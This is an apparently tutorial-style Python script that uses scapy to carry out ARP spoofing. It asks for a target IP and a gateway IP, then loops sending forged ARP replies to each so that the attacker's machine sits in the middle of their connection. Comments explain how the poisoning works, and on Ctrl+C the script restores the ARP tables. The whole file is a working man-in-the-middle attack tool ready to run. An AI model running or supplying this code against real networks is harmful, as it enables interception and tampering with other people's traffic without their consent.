#!/usr/bin/env python3

import scapy.all as scapy
import time

# scapy.ls(scapy.ARP)
"""
hwtype     : XShortField                         = (1)
ptype      : XShortEnumField                     = (2048)
hwlen      : FieldLenField                       = (None)
plen       : FieldLenField                       = (None)
op         : ShortEnumField                      = (1)
hwsrc      : MultipleTypeField                   = (None)
psrc       : MultipleTypeField                   = (None)
hwdst      : MultipleTypeField                   = (None)
pdst       : MultipleTypeField                   = (None)

"""

# CHECK THE NETWORK SCANNER PROGRAM TO UNDERSTAND THIS FUNCTION BETTER


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=2, verbose=False)[0]

    try:
        return answered_list[0][1].hwsrc
    except:
        pass


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)  # it makes the mac of the source as our mac by default
    scapy.send(packet, verbose=False)


# op means  I  when creating the ARP packet it will create a ARP request (but we need an ARP response telling the router and target that I am the target and the router respectively)
# therefore to make it as a response op should be 2

# pdst : ip of the target computer
# hwdst : MAC address of the tagret computer
# psrc : ip of the source (of the router) : i.e. we will be sending the packet to the target telling him that I am the source(router)
# packet = spoof("10.42.0.209","10.42.0.1")


# therefore now the ip table of the target will have my computer as the router
# therefore it will associate the router ip with the mac address of the attacker thererby placing him in the middle of connection
# so everytime the target computer wants to send anything to the router it will use the MAC address associated with router (which is of the attacker)


# print(packet.show())
"""
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = is-at
  hwsrc     = 00:32:11:11:23:d7 #our mac address 
  psrc      = 10.42.0.1
  hwdst     = d8:c0:a6:bf:20:17
  pdst      = 10.42.0.209

None

"""
# print(packet.summary())
"""
ARP is at 00:32:11:00:23:d7 says 10.42.0.1       #meaning that this MAc says that my IP is this
"""


# TO SEND THE PACKET
# scapy.send(packet)

# after sending this the MAC address associated with the router will be changed to your MAC address


# NOW TO FOOL THE TARGET INTO TELLING IT THAT WE ARE THE TARGET
# spoof("10.42.0.1","10.42.0.209")


# TO CONTINUE TO SEND THE PACKETS AND STAY IN THE MIDDLE OF THE CONNECTION


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # the only difference here is we manually put the source mac as the original source mac and not our mac
    # print(packet.show())
    # print(packet.summary())
    # count = 4 will send the packet 4 times to make sure it is changed
    scapy.send(packet, count=4, verbose=False)
    """
    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = is-at
    hwsrc     = fc:01:7c:74:f0:79 #actual source
    psrc      = 10.42.0.1
    hwdst     = 00:00:00:00:00:00
    pdst      = 10.42.0.147

    None
    ARP is at fc:01:7c:74:f0:79 says 10.42.0.1


    ###[ ARP ]### 
    hwtype    = 0x1
    ptype     = IPv4
    hwlen     = None
    plen      = None
    op        = is-at
    hwsrc     = 00:32:11:00:23:d7
    psrc      = 10.42.0.147
    hwdst     = fc:01:7c:74:f0:79
    pdst      = 10.42.0.1

    None
    ARP is at 00:32:11:00:23:d7 says 10.42.0.147
    Finished.
        
        
    """


target_ip = input("[+] Enter the IP of the target device : ")
router_ip = input("[+] Enter the IP of the gateway(router) : ")

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        # print("[+] Sent two packets ( one to the target, one to the router )")
        print("\r[+] Packets sent : " + str(sent_packets_count),
              end='')  # dynamic printing!
        # \r starts printing from the end of the line
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CNTRL+C.\n[+] Resetting ARP tables.")
    restore(target_ip, router_ip)  # restoring the tables of the target
    restore(router_ip, target_ip) # restoring the tables of the router
    print("[+]Finished.\n[+] Quitting.")
    exit()
